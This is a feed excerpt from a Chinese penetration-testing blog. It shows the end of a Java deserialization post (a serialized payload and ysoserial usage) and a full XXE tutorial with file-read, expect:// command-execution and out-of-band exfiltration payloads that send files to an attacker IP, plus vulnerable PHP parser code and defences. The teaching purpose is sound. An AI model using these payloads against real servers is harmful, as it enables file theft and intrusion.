outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把VulnerableTaskHolder.java也弄到这里去：目录为src文件夹中，org.dummy.insecure.framework文件夹下，注意删掉错误的部分。运行即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAfnBgYRFBgzn0lIeHQAE3BpbmcgLW4gNiAxMjcuMC4wLjF0AARwaW5n</span><br></pre></td></tr></table></figure><p>所以我们要构造的恶意代码应该遵循：<strong>恶意命令→序列化→base64→rO0AB格式字符串【最终Payload】</strong></p><p>当然，我们可以使用DNSlog测试：<code>VulnerableTaskHolder vuln = new VulnerableTaskHolder(&quot;qwq&quot;,&quot;ping ***.dnslog.cn&quot;);</code></p><blockquote><p>这个恶意命令一般是反弹shell，因为考虑到有的不回显。</p></blockquote><h4 id="ysoserial"><a class="markdownIt-Anchor" href="#ysoserial"></a> ysoserial</h4><p>可以看到里面有很多组件，选择其中的一个，然后通过他给出的指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Usage: java -jar ysoserial-[version]-all.jar [payload] &#x27;[command]&#x27;</span><br></pre></td></tr></table></figure><p>我们找到需要的组件，然后生成即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .\ysoserial.jar Hibernate1 calc.exe &gt; payload.bin</span><br></pre></td></tr></table></figure><h1 id="php反序列化"><a class="markdownIt-Anchor" href="#php反序列化"></a> PHP反序列化</h1><p>PHP反序列化不是本章的重点，所以浅浅说一下，这里面的序列化结构如下：</p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/1685949580662.png" alt="1685949580662" style="zoom:67%;" /><p>具体可以参考如下导图做简单的复习：</p><p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="PHP反序列化" /></p><p>参考：</p><ol><li><a href="https://xz.aliyun.com/t/12507#toc-11">https://xz.aliyun.com/t/12507#toc-11</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java反序列化&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#java反序列化&quot;&gt;&lt;/a&gt; JAVA反序列化&lt;/h1&gt;
&lt;h2 id=&quot;概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概念&quot;&gt;&lt;/a&gt; </summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="反序列化" scheme="https://j3f5.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>DNSlog数据外带在各种攻击的利用方式（无回显）</title>
    <link href="https://j3f5.github.io/articles/2023/06/06/DNSlog%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6%E5%9C%A8%E5%90%84%E7%A7%8D%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89/"/>
    <id>https://j3f5.github.io/articles/2023/06/06/DNSlog%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6%E5%9C%A8%E5%90%84%E7%A7%8D%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89/</id>
    <published>2023-06-06T02:09:43.000Z</published>
    <updated>2023-06-06T02:09:43.000Z</updated>
    
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="sql注入" scheme="https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="XSS" scheme="https://j3f5.github.io/tags/XSS/"/>
    
    <category term="RCE" scheme="https://j3f5.github.io/tags/RCE/"/>
    
    <category term="XXE" scheme="https://j3f5.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>XXE与XML的利用与绕过</title>
    <link href="https://j3f5.github.io/articles/2023/06/05/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/"/>
    <id>https://j3f5.github.io/articles/2023/06/05/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/</id>
    <published>2023-06-05T13:48:11.000Z</published>
    <updated>2023-06-05T13:48:11.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/XXE%E4%B8%8EXML.png" alt="XXE与XML" /></p><h1 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h1><h2 id="xml"><a class="markdownIt-Anchor" href="#xml"></a> XML</h2><p>XML 被设计为传输和存储数据，XML 文档结构包括</p><ol><li>XML 声明</li><li>DTD 文档类型定义（可选）</li><li>文档元素</li></ol><p>其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。</p><h2 id="xxe"><a class="markdownIt-Anchor" href="#xxe"></a> XXE</h2><p>XXE 漏洞全称 XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可<strong>加载恶意外部文件</strong>，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><h2 id="xml-与-html-的主要差异"><a class="markdownIt-Anchor" href="#xml-与-html-的主要差异"></a> XML 与 HTML 的主要差异</h2><ul><li><p>XML 被设计为传输和存储数据，其焦点是数据的内容。</p></li><li><p>HTML 被设计用来显示数据，其焦点是数据的外观。HTML 旨在显示信息 ，而 XML 旨在传输信息。</p></li></ul><h2 id="xml文档格式"><a class="markdownIt-Anchor" href="#xml文档格式"></a> XML文档格式</h2><p>其中DOCTYPE是DTD的声明；ENTITY是DDT实体的声明，所谓实体可以理解为变量。SYSTEM、PUBLIC是外部资源的申请。看到SYSTEM后面的文件是可以指向文件的，如果可以被我们控制，那么我们就可以读取服务器文件信息，或者<strong>远程文件</strong>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML 声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [ &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span> &lt;!--定义 note 元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span> &lt;!--定义 to 元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span> &lt;!-- 定义 from 元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">head</span> (<span class="keyword">#PCDATA</span>)&gt;</span> &lt;!-- 定义 head 元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span> &lt;!-- 定义 body 元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;test&quot;</span>&gt;</span> &lt;!-- 外部实体 --&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="dtd声明"><a class="markdownIt-Anchor" href="#dtd声明"></a> DTD声明</h3><p>文档类型定义（DTD）可定义合法的 XML 文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 内部的 DOCTYPE 声明 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 外部文档声明 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">SYSTEM</span> ”文件名”&gt;</span></span><br></pre></td></tr></table></figure><h3 id="dtd-实体"><a class="markdownIt-Anchor" href="#dtd-实体"></a> DTD 实体</h3><h4 id="内部实体"><a class="markdownIt-Anchor" href="#内部实体"></a> 内部实体</h4><p>略</p><h4 id="外部实体通用实体"><a class="markdownIt-Anchor" href="#外部实体通用实体"></a> 外部实体（通用实体）</h4><p>外部实体表示外部文件的内容，用 SYSTEM 关键词表示，通常使用</p><ol><li><code>&lt;!DOCTYPE 根元素 SYSTEM “文件名&quot;&gt;</code></li><li><code>&lt;!DOCTYPE 根元素 PUBLIC “public_ID&quot; “文件名&quot;&gt;</code></li></ol><p>的形式引用外部实体。</p><h4 id="参数实体"><a class="markdownIt-Anchor" href="#参数实体"></a> 参数实体</h4><ol><li>使用<code> % 实体名</code>（这里空格不能少）在 DTD 中定义，并且只能在 DTD 中使用 <code>%实体名;</code> 引用</li><li>只有在DTD文件中，参数实体的声明才能引用其他实体</li><li>和通用实体一样，参数实体也可以外部引用</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br><span class="line">%an-element;%remote-dtd;</span><br></pre></td></tr></table></figure><h4 id="举例子java"><a class="markdownIt-Anchor" href="#举例子java"></a> 举例子（java）</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 内部实体声明 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名称 ”实体的值”&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 外部实体声明 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="keyword">SYSTEM</span> ”URI”&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 参数实体声明 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %实体名称 ”实体的值”&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %实体名称 <span class="keyword">SYSTEM</span> ”URI”&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 举例内部实体 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;test&quot;</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- 举例外部实体 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.1.1/kk.php&quot;</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- 举例内部实体 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;test&quot;</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- 引用实体 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">credit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">credit</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用图解释一下：</p><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/xxe-parser.png" alt="XML parser" style="zoom:67%;" /><p>而JAVA是怎么把它变成对象的呢？在Java应用程序中，XML可以用来从客户端获取数据到服务器，我们都熟悉JSON apis，我们也可以用xml来获取信息。大多数情况下，框架会根据xml结构自动填充Java对象，例如：</p><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/xxe-parser-java.png" alt="XML parser" style="zoom:67%;" /><h1 id="注入攻击"><a class="markdownIt-Anchor" href="#注入攻击"></a> 注入攻击</h1><h2 id="xml注入攻击内部实体攻击"><a class="markdownIt-Anchor" href="#xml注入攻击内部实体攻击"></a> XML注入攻击（内部实体攻击）</h2><p>为什么要提XML注入呢，我们从XXE的全称（XML外部实体注入）可以看出，XXE也是一种XML注入，只不过注入的是XML外部实体罢了，所以看一下。看到，就是插入了一个数据，跟sql啥的一般无二，但是得注意标头是怎么样的，实际上没什么用。</p><p><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/webp-167696929251616.webp" alt="img" /></p><p>服务器解析xml的php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="title function_ invoke__">libxml_disable_entity_loader</span> (<span class="literal">false</span>);</span><br><span class="line">   <span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">   <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">   <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">   <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$creds</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中<code>libxml_disable_entity_loader（BOOL）</code>函数接收true或false两种布尔型参数，用来表示是否允许禁用外部加载实体，当值为false时允许加载外部实体；通过file_get_contents()加载传入的参数，再通过DOMDocument类中的loadXML函数加载外部传入的实体（XML），最后将结果返回显示。</p><h2 id="xxe-2"><a class="markdownIt-Anchor" href="#xxe-2"></a> XXE</h2><p>因此我们构造一个XML外部实体，用来访问服务器上的敏感文件，然后再数据传输过程中将自己的实体注入。</p><h3 id="读文件"><a class="markdownIt-Anchor" href="#读文件"></a> 读文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/windows/system.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h4 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> 绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p>通过各种协议绕过</p><h3 id="内网探针或攻击内网应用难利用"><a class="markdownIt-Anchor" href="#内网探针或攻击内网应用难利用"></a> 内网探针或攻击内网应用（难利用）</h3><p><strong>实际应用中基本碰不到（触发漏洞地址），因为有前提条件：</strong></p><ul><li>内网IP地址</li><li>开放端口</li><li>存在xxe漏洞</li><li>构造漏洞地址</li></ul><h3 id="rce难利用"><a class="markdownIt-Anchor" href="#rce难利用"></a> RCE（难利用）</h3><p>该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令 <strong>实际应用中很难碰到</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h3 id="引入外部实体-dtd"><a class="markdownIt-Anchor" href="#引入外部实体-dtd"></a> 引入外部实体 dtd</h3><p>条件：</p><ol><li>观察是否禁止外部实体引入（有点像本地包含与远程包含）</li></ol><p>引入外部实体的原因：</p><ol><li>自定义攻击代码</li><li>绕过恶意代码检测</li></ol><p>代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:80/evil2.dtd&quot;&gt;</span><br><span class="line">%file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;send;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p><strong>evil2.dtd:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY send SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="无回显读文件"><a class="markdownIt-Anchor" href="#无回显读文件"></a> 无回显读文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:80/evil2.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><strong>evil2.dtd</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://127.0.0.1:80/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><h3 id="无回显读文件外带数据可dnslog"><a class="markdownIt-Anchor" href="#无回显读文件外带数据可dnslog"></a> 无回显读文件——外带数据（可dnslog）</h3><p>操作：</p><ol><li><p>服务器处理XML源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li><li><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://my.local.cn/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>再提交数据的时候引用另一个DTD文件，test.dtd将服务器上的敏感文件进行base64编码后转发给攻击者ip：9999端口上</p></li><li><p>test.dtd （来自你的恶意dtd，在你的服务器里面）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/windows/system.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://192.168.210.37:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/webp-167697018708020.webp" alt="img" /></p></li></ol><p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 %)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程主机上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p><p>进一步对XXE漏洞分析后，我们可以很清晰地看到我们实际上都是通过<strong>file协议读取本地文件</strong>，或者通过<strong>http协议发出请求</strong>，<strong>类比一下其他漏洞例如SSRF</strong>，发现这两种漏洞的利用方式非常相似，因为他们都是从服务器向另一台服务器发起请求，所以想要更进一步的利用XXE漏洞我们要清楚在何种平台可以使用何种协议：</p><table><thead><tr><th>libxml2</th><th>PHP</th><th>JAVA</th><th>.NET</th></tr></thead><tbody><tr><td>file<br/>http<br/>ftp</td><td>file<br/>http<br/>ftp<br/>php<br/>compress.zlib<br/>compress.bzip2<br/>data<br/>glob<br/>phar</td><td>http<br/>https<br/>ftp<br/>file<br/>jar<br/>net<br/>doc<br/>mailto<br/>gopher *</td><td>file<br/>http<br/>https<br />ftp</td></tr></tbody></table><h1 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h1><ol><li><p><strong>使用开发语言提供的禁用外部实体的方法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP： </span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance()；dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python: </span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure></li><li><p><strong>过滤用户提交的XML数据</strong></p><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p></li><li><p><strong>使用第三方应用代码及时升级补丁</strong></p></li></ol><h1 id="实操"><a class="markdownIt-Anchor" href="#实操"></a> 实操</h1><h2 id="发现漏洞"><a class="markdownIt-Anchor" href="#发现漏洞"></a> 发现漏洞</h2><p><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/image-20230606091005275.png" alt="image-20230606091005275" style="zoom:50%;" /><img src="/images/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/image-20230606091112388.png" alt="image-20230606091112388" style="zoom:50%;" /></p><p>从上面可以看到：XML的数据传输。则在传输数据的地方贴上payload。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">Mikasa</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///e:/you.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 注： file:///c:/ 和 file:/// 分别是windows 和 Linux的r--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 回显 --&gt;</span></span><br><span class="line">what?(我的文本)</span><br></pre></td></tr></table></figure><h2 id="更改类型盲猜"><a class="markdownIt-Anchor" href="#更改类型盲猜"></a> 